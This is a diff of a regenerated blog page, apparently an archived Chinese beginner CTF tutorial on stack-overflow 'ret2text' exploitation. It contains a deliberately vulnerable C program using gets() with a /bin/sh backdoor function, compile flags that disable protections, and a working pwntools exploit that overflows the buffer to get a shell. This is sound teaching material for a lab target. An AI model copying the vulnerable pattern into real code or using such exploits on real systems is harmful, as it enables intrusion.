@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 4.2.0">
+<meta name="generator" content="Hexo 6.3.0">
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
   <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
   <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
@@ -20,12 +20,12 @@
     var CONFIG = {"hostname":"archive.next.arttnba3.cn","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="Pwn从入门到入狱Copyright © 2020 arttnba3,XDSEC 简介：什么是Pwn？Pwn &#x2F;poʊn&#x2F;这个词本身其实是一个拟声词，最初来源于黑客们设想中的完全获取一台设备的控制权后便会发出“砰”的一声，Pwn因此而得名，即利用挖掘到的二进制漏洞对设备或系统发起攻击，并最终拿到shell（获取控制权） Pwn也是最能代表原教旨主义黑客的一个安全研究方向同时也是最容易进监狱的一个方">
+  <meta name="description" content="Pwn从入门到入狱Copyright © 2020 arttnba3,XDSEC 简介：什么是Pwn？Pwn &#x2F;poʊn&#x2F;这个词本身其实是一个拟声词，最初来源于黑客们设想中的完全获取一台设备的控制权后便会发出“砰”的一声，Pwn因此而得名，即利用挖掘到的二进制漏洞对设备或系统发起攻击，并最终拿到shell（获取控制权） Pwn也是最能代表原教旨主义黑客的一个安全研究方向同时也是">
 <meta property="og:type" content="article">
 <meta property="og:title" content="【CTF资料-0x0001】moeCTF2020-Pwn从入门到入狱 by arttnba3">
 <meta property="og:url" content="http://archive.next.arttnba3.cn/2020/09/17/%E3%80%90CTF%E8%B5%84%E6%96%99-0x0001%E3%80%91moeCTF2020-Pwn%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1%20by%20arttnba3/index.html">
-<meta property="og:site_name" content="arttnba3&#39;s blog">
-<meta property="og:description" content="Pwn从入门到入狱Copyright © 2020 arttnba3,XDSEC 简介：什么是Pwn？Pwn &#x2F;poʊn&#x2F;这个词本身其实是一个拟声词，最初来源于黑客们设想中的完全获取一台设备的控制权后便会发出“砰”的一声，Pwn因此而得名，即利用挖掘到的二进制漏洞对设备或系统发起攻击，并最终拿到shell（获取控制权） Pwn也是最能代表原教旨主义黑客的一个安全研究方向同时也是最容易进监狱的一个方">
+<meta property="og:site_name" content="arttnba3&#39;s old blog">
+<meta property="og:description" content="Pwn从入门到入狱Copyright © 2020 arttnba3,XDSEC 简介：什么是Pwn？Pwn &#x2F;poʊn&#x2F;这个词本身其实是一个拟声词，最初来源于黑客们设想中的完全获取一台设备的控制权后便会发出“砰”的一声，Pwn因此而得名，即利用挖掘到的二进制漏洞对设备或系统发起攻击，并最终拿到shell（获取控制权） Pwn也是最能代表原教旨主义黑客的一个安全研究方向同时也是">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://i.loli.net/2020/09/19/VrEYoaTgXHztuek.png">
 <meta property="og:image" content="https://i.loli.net/2020/09/19/3V8ZP2kTlwjBArp.png">
@@ -48,11 +48,11 @@
 <meta property="article:published_time" content="2020-09-17T14:19:20.000Z">
 <meta property="article:modified_time" content="2020-11-28T08:55:34.439Z">
 <meta property="article:author" content="arttnba3">
+<meta property="article:tag" content="ret2text">
+<meta property="article:tag" content="python">
 <meta property="article:tag" content="信息安全">
 <meta property="article:tag" content="PWN">
 <meta property="article:tag" content="CTF">
-<meta property="article:tag" content="ret2text">
-<meta property="article:tag" content="python">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://i.loli.net/2020/09/19/VrEYoaTgXHztuek.png">
 
@@ -69,7 +69,7 @@
   };
 </script>
 
-  <title>【CTF资料-0x0001】moeCTF2020-Pwn从入门到入狱 by arttnba3 | arttnba3's blog</title>
+  <title>【CTF资料-0x0001】moeCTF2020-Pwn从入门到入狱 by arttnba3 | arttnba3's old blog</title>
   
 
 
@@ -100,7 +100,7 @@
   </style>
 </noscript>
 
-<link rel="alternate" href="/atom.xml" title="arttnba3's blog" type="application/atom+xml">
+<link rel="alternate" href="/atom.xml" title="arttnba3's old blog" type="application/atom+xml">
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage">
@@ -121,10 +121,10 @@
 
     <a href="/" class="brand" rel="start">
       <span class="logo-line-before"><i></i></span>
-      <h1 class="site-title">arttnba3's blog</h1>
+      <h1 class="site-title">arttnba3's old blog</h1>
       <span class="logo-line-after"><i></i></span>
     </a>
-      <p class="site-subtitle" itemprop="description">- arttnba3的隐秘小窝 -</p>
+      <p class="site-subtitle" itemprop="description">- arttnba3的垃圾堆积处 -</p>
   </div>
 
   <div class="site-nav-right">
@@ -198,11 +198,11 @@
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.png">
       <meta itemprop="name" content="arttnba3">
-      <meta itemprop="description" content="- 做了关于你的梦，所以不愿醒来呢 -">
+      <meta itemprop="description" content="此页面已废弃，新博客: arttnba3.cn">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="arttnba3's blog">
+      <meta itemprop="name" content="arttnba3's old blog">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
@@ -254,9 +254,9 @@
 
       
         <h1 id="Pwn从入门到入狱"><a href="#Pwn从入门到入狱" class="headerlink" title="Pwn从入门到入狱"></a>Pwn从入门到入狱</h1><p>Copyright © 2020 arttnba3,XDSEC</p>
-<h2 id="简介：什么是Pwn？"><a href="#简介：什么是Pwn？" class="headerlink" title="简介：什么是Pwn？"></a>简介：什么是Pwn？</h2><p><strong>Pwn /poʊn/</strong>这个词本身其实是一个拟声词，最初来源于黑客们设想中的完全获取一台设备的控制权后便会发出“砰”的一声，Pwn因此而得名，即<strong>利用挖掘到的二进制漏洞对设备或系统发起攻击，并最终拿到shell（获取控制权）</strong></p>
+<h2 id="简介：什么是Pwn？"><a href="#简介：什么是Pwn？" class="headerlink" title="简介：什么是Pwn？"></a>简介：什么是Pwn？</h2><p><strong>Pwn &#x2F;poʊn&#x2F;<strong>这个词本身其实是一个拟声词，最初来源于黑客们设想中的完全获取一台设备的控制权后便会发出“砰”的一声，Pwn因此而得名，即</strong>利用挖掘到的二进制漏洞对设备或系统发起攻击，并最终拿到shell（获取控制权）</strong></p>
 <p>Pwn也是最能代表<strong>原教旨主义黑客</strong>的一个安全研究方向<del>同时也是最容易进监狱的一个方向</del></p>
-<a id="more"></a>
+<span id="more"></span>
 
 <h2 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h2><p>作为二进制安全的分支之一，Pwn需要你<strong>熟练掌握</strong>如下基础知识：</p>
 <ul>
@@ -296,14 +296,14 @@
 <h4 id="百度“Linux-换源”与“pip-换源”更换Linux下的软件源为国内的软件源，提高下载速度"><a href="#百度“Linux-换源”与“pip-换源”更换Linux下的软件源为国内的软件源，提高下载速度" class="headerlink" title="百度“Linux 换源”与“pip 换源”更换Linux下的软件源为国内的软件源，提高下载速度"></a>百度“Linux 换源”与“pip 换源”更换Linux下的软件源为国内的软件源，提高下载速度</h4><h4 id="不同的Linux发行版本（如Ubuntu、Kali、manjaro等）请自行将搜索框内的“linux”换为对应的发行版名称"><a href="#不同的Linux发行版本（如Ubuntu、Kali、manjaro等）请自行将搜索框内的“linux”换为对应的发行版名称" class="headerlink" title="不同的Linux发行版本（如Ubuntu、Kali、manjaro等）请自行将搜索框内的“linux”换为对应的发行版名称"></a>不同的Linux发行版本（如Ubuntu、Kali、manjaro等）请自行将搜索框内的“linux”换为对应的发行版名称</h4></blockquote>
 <p>以下内容将通过几个样例简单地帮助你入门Pwn</p>
 <h3 id="以下内容操作环境位于Linux："><a href="#以下内容操作环境位于Linux：" class="headerlink" title="以下内容操作环境位于Linux："></a>以下内容操作环境位于Linux：</h3><p>我们现在来看这样的一个程序：</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">backdoor</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> str[<span class="number">20</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"tell me your name plz:"</span>);</span><br><span class="line">    gets(str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    func();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">backdoor</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">20</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;tell me your name plz:&quot;</span>);</span><br><span class="line">    <span class="built_in">gets</span>(str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">func</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>我们使用<code>-fno-stack-protector</code>、<code>-z norelro</code>、<code>-z execstack</code>、<code>-no-pie</code>这四条编译指令把这个程序的保护都给关掉</p>
 <p><img src="https://i.loli.net/2020/09/19/VrEYoaTgXHztuek.png" alt="image.png"></p>
 <h4 id="安全检查：checksec"><a href="#安全检查：checksec" class="headerlink" title="安全检查：checksec"></a>安全检查：checksec</h4><p><strong>使用<code>checksec</code>指令可以查看程序的保护开启情况</strong></p>
 <p><img src="https://i.loli.net/2020/09/19/3V8ZP2kTlwjBArp.png" alt="image.png"></p>
 <p>可以在控制台输入如下指令安装：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt install checksec</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo apt install checksec</span></span><br></pre></td></tr></table></figure>
 
 <h4 id="逻辑分析"><a href="#逻辑分析" class="headerlink" title="逻辑分析"></a>逻辑分析</h4><p>这个程序做了些什么？</p>
 <ul>
@@ -362,7 +362,7 @@
 <p>我们还是以刚刚反汇编出来的代码进行分析：</p>
 <p>右键菜单可以切换到文本模式，也可以切换回图标格式，文本模式方便我们得以一窥程序原貌，图标模式则方便我们理解函数内的逻辑</p>
 <p><img src="https://i.loli.net/2020/09/19/1A5cH3GkKp6uYsb.png" alt="image.png"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000040055A ; Attributes: bp-based frame</span><br><span class="line">.text:000000000040055A</span><br><span class="line">.text:000000000040055A                 public func</span><br><span class="line">.text:000000000040055A func            proc near               ; CODE XREF: main+4↓p</span><br><span class="line">.text:000000000040055A</span><br><span class="line">.text:000000000040055A var_20          &#x3D; byte ptr -20h</span><br><span class="line">.text:000000000040055A</span><br><span class="line">.text:000000000040055A ; __unwind &#123;</span><br><span class="line">.text:000000000040055A                 push    rbp</span><br><span class="line">.text:000000000040055B                 mov     rbp, rsp</span><br><span class="line">.text:000000000040055E                 sub     rsp, 20h</span><br><span class="line">.text:0000000000400562                 lea     rdi, s          ; &quot;tell me your name plz&quot;</span><br><span class="line">.text:0000000000400569                 call    _puts</span><br><span class="line">.text:000000000040056E                 lea     rax, [rbp+var_20]</span><br><span class="line">.text:0000000000400572                 mov     rdi, rax</span><br><span class="line">.text:0000000000400575                 mov     eax, 0</span><br><span class="line">.text:000000000040057A                 call    _gets</span><br><span class="line">.text:000000000040057F                 nop</span><br><span class="line">.text:0000000000400580                 leave</span><br><span class="line">.text:0000000000400581                 retn</span><br><span class="line">.text:0000000000400581 ; &#125; &#x2F;&#x2F; starts at 40055A</span><br><span class="line">.text:0000000000400581 func            endp</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000040055A ; Attributes: bp-based frame</span><br><span class="line">.text:000000000040055A</span><br><span class="line">.text:000000000040055A                 public func</span><br><span class="line">.text:000000000040055A func            proc near               ; CODE XREF: main+4↓p</span><br><span class="line">.text:000000000040055A</span><br><span class="line">.text:000000000040055A var_20          = byte ptr -20h</span><br><span class="line">.text:000000000040055A</span><br><span class="line">.text:000000000040055A ; __unwind &#123;</span><br><span class="line">.text:000000000040055A                 push    rbp</span><br><span class="line">.text:000000000040055B                 mov     rbp, rsp</span><br><span class="line">.text:000000000040055E                 sub     rsp, 20h</span><br><span class="line">.text:0000000000400562                 lea     rdi, s          ; &quot;tell me your name plz&quot;</span><br><span class="line">.text:0000000000400569                 call    _puts</span><br><span class="line">.text:000000000040056E                 lea     rax, [rbp+var_20]</span><br><span class="line">.text:0000000000400572                 mov     rdi, rax</span><br><span class="line">.text:0000000000400575                 mov     eax, 0</span><br><span class="line">.text:000000000040057A                 call    _gets</span><br><span class="line">.text:000000000040057F                 nop</span><br><span class="line">.text:0000000000400580                 leave</span><br><span class="line">.text:0000000000400581                 retn</span><br><span class="line">.text:0000000000400581 ; &#125; // starts at 40055A</span><br><span class="line">.text:0000000000400581 func            endp</span><br></pre></td></tr></table></figure>
 
 
 
@@ -381,7 +381,7 @@
 <p><img src="https://i.loli.net/2020/09/10/6Nt9GE1BWZ5ij2R.png" alt="AF0BBCCF20D852033C201460B566F5DA.png"></p>
 <p>我们最终的目的是<strong>获取到shell</strong>，那么只要程序当中存在着<code>system(&quot;/bin/sh&quot;)</code>的函数调用，我们再将程序返回到其地址上，即可get shell</p>
 <p>构造payload如下</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b'A'</span>*(<span class="number">0x20</span>+<span class="number">8</span>) + p64(sys_addr)		<span class="comment"># 别忘了8字节的rbp哟</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>) + p64(sys_addr)		<span class="comment"># 别忘了8字节的rbp哟</span></span><br></pre></td></tr></table></figure>
 
 
 
@@ -391,17 +391,17 @@
 <blockquote>
 <p>pwntools需要在<strong>Linux</strong>系统下使用（如Ubuntu、manjaro、kali等）</p>
 <p>在shell中输入如下指令安装pwntools</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo pip install pwntools</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo pip install pwntools</span></span><br></pre></td></tr></table></figure>
 </blockquote>
 <p>使用pwntools库我们可以很方便地输入相应的payload</p>
 <p>接下来我们就该开始构造我们用以get shell的脚本了，利用pwntools库，构造exp如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *				<span class="comment"># 从pwntools库中导入所需要的一切</span></span><br><span class="line">p = process(<span class="string">'./test'</span>)			<span class="comment"># 运行一个程序</span></span><br><span class="line">								<span class="comment"># 需要注意的是，在连接远程服务器的时候，使用的是remote()</span></span><br><span class="line">    							<span class="comment"># p = remote(addr,port)</span></span><br><span class="line">        						<span class="comment"># 如：p = remote('sec.arttnba3.cn',10001)</span></span><br><span class="line">p.recv()						<span class="comment"># 从程序中读取输入直到下一个断点（如遇到输入语句）</span></span><br><span class="line">sys_addr = p64(<span class="number">0x400547</span>)		<span class="comment"># 将地址构造为符合小端模式的bytes数组，长度为8</span></span><br><span class="line">								<span class="comment"># 需要注意的是在32位下应当使用p32()，长度为4</span></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x28</span> + sys_addr	<span class="comment"># 构造我们的payload</span></span><br><span class="line">p.sendline(payload)				<span class="comment"># 向程序发送我们的输入</span></span><br><span class="line">								<span class="comment"># 需要注意的是，sendline()会在末尾添加换行符'\n'</span></span><br><span class="line">    							<span class="comment"># 若不想要发送多余的换行符，可以使用send()方法</span></span><br><span class="line">p.interactive()					<span class="comment"># 程序进入interactive模式，即进入我们与程序直接交互的界面</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *				<span class="comment"># 从pwntools库中导入所需要的一切</span></span><br><span class="line">p = process(<span class="string">&#x27;./test&#x27;</span>)			<span class="comment"># 运行一个程序</span></span><br><span class="line">								<span class="comment"># 需要注意的是，在连接远程服务器的时候，使用的是remote()</span></span><br><span class="line">    							<span class="comment"># p = remote(addr,port)</span></span><br><span class="line">        						<span class="comment"># 如：p = remote(&#x27;sec.arttnba3.cn&#x27;,10001)</span></span><br><span class="line">p.recv()						<span class="comment"># 从程序中读取输入直到下一个断点（如遇到输入语句）</span></span><br><span class="line">sys_addr = p64(<span class="number">0x400547</span>)		<span class="comment"># 将地址构造为符合小端模式的bytes数组，长度为8</span></span><br><span class="line">								<span class="comment"># 需要注意的是在32位下应当使用p32()，长度为4</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x28</span> + sys_addr	<span class="comment"># 构造我们的payload</span></span><br><span class="line">p.sendline(payload)				<span class="comment"># 向程序发送我们的输入</span></span><br><span class="line">								<span class="comment"># 需要注意的是，sendline()会在末尾添加换行符&#x27;\n&#x27;</span></span><br><span class="line">    							<span class="comment"># 若不想要发送多余的换行符，可以使用send()方法</span></span><br><span class="line">p.interactive()					<span class="comment"># 程序进入interactive模式，即进入我们与程序直接交互的界面</span></span><br></pre></td></tr></table></figure>
 
 <p><strong>成功get shell</strong></p>
 <p><img src="https://i.loli.net/2020/09/19/gaKMp2WFLs8coRJ.png" alt="image.png"></p>
 <p>至此，我们已经完成了<strong>从0开始利用gets()函数的栈溢出漏洞获取最高权限的整个过程</strong>，接下来就该靠你自己的努力，去分析、利用每一个可以被利用的系统漏洞，夺取最高权限了</p>
 <p><strong>为了拥有“能够getshell任意一台设备”的能力而努力吧！新生代的黑客们！</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;PWN_T0_0WN!&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;PWN_T0_0WN!&#125;</span><br></pre></td></tr></table></figure>
     </div>
 
     
@@ -439,11 +439,11 @@
 
       <footer class="post-footer">
           <div class="post-tags">
+              <a href="/tags/ret2text/" rel="tag"># ret2text</a>
+              <a href="/tags/python/" rel="tag"># python</a>
               <a href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" rel="tag"># 信息安全</a>
               <a href="/tags/PWN/" rel="tag"># PWN</a>
               <a href="/tags/CTF/" rel="tag"># CTF</a>
-              <a href="/tags/ret2text/" rel="tag"># ret2text</a>
-              <a href="/tags/python/" rel="tag"># python</a>
           </div>
 
         
@@ -518,7 +518,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Pwn从入门到入狱"><span class="nav-number">1.</span> <span class="nav-text">Pwn从入门到入狱</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#简介：什么是Pwn？"><span class="nav-number">1.1.</span> <span class="nav-text">简介：什么是Pwn？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#预备知识"><span class="nav-number">1.2.</span> <span class="nav-text">预备知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pwn的解题过程？"><span class="nav-number">1.3.</span> <span class="nav-text">Pwn的解题过程？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0基础入门：新人的第一个安全漏洞的利用——栈溢出——ret2text"><span class="nav-number">1.4.</span> <span class="nav-text">0基础入门：新人的第一个安全漏洞的利用——栈溢出——ret2text</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#前置知识要求："><span class="nav-number">1.4.0.1.</span> <span class="nav-text">前置知识要求：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#前置环境要求："><span class="nav-number">1.4.0.2.</span> <span class="nav-text">前置环境要求：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#百度“Linux-换源”与“pip-换源”更换Linux下的软件源为国内的软件源，提高下载速度"><span class="nav-number">1.4.0.3.</span> <span class="nav-text">百度“Linux 换源”与“pip 换源”更换Linux下的软件源为国内的软件源，提高下载速度</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#不同的Linux发行版本（如Ubuntu、Kali、manjaro等）请自行将搜索框内的“linux”换为对应的发行版名称"><span class="nav-number">1.4.0.4.</span> <span class="nav-text">不同的Linux发行版本（如Ubuntu、Kali、manjaro等）请自行将搜索框内的“linux”换为对应的发行版名称</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#以下内容操作环境位于Linux："><span class="nav-number">1.4.1.</span> <span class="nav-text">以下内容操作环境位于Linux：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#安全检查：checksec"><span class="nav-number">1.4.1.1.</span> <span class="nav-text">安全检查：checksec</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#逻辑分析"><span class="nav-number">1.4.1.2.</span> <span class="nav-text">逻辑分析</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#以下内容操作环境位于Windows："><span class="nav-number">1.4.2.</span> <span class="nav-text">以下内容操作环境位于Windows：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#IDA：逆向分析"><span class="nav-number">1.4.2.1.</span> <span class="nav-text">IDA：逆向分析</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#F5键：使用IDA进行逆向分析的神器"><span class="nav-number">1.4.3.</span> <span class="nav-text">F5键：使用IDA进行逆向分析的神器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#以下内容操作环境位于Linux：-1"><span class="nav-number">1.4.4.</span> <span class="nav-text">以下内容操作环境位于Linux：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#栈帧"><span class="nav-number">1.4.4.1.</span> <span class="nav-text">栈帧</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#攻击神器：pwntools"><span class="nav-number">1.4.4.2.</span> <span class="nav-text">攻击神器：pwntools</span></a></li></ol></li></ol></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Pwn%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1"><span class="nav-number">1.</span> <span class="nav-text">Pwn从入门到入狱</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B%EF%BC%9A%E4%BB%80%E4%B9%88%E6%98%AFPwn%EF%BC%9F"><span class="nav-number">1.1.</span> <span class="nav-text">简介：什么是Pwn？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%84%E5%A4%87%E7%9F%A5%E8%AF%86"><span class="nav-number">1.2.</span> <span class="nav-text">预备知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pwn%E7%9A%84%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B%EF%BC%9F"><span class="nav-number">1.3.</span> <span class="nav-text">Pwn的解题过程？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%EF%BC%9A%E6%96%B0%E4%BA%BA%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E2%80%94%E2%80%94%E6%A0%88%E6%BA%A2%E5%87%BA%E2%80%94%E2%80%94ret2text"><span 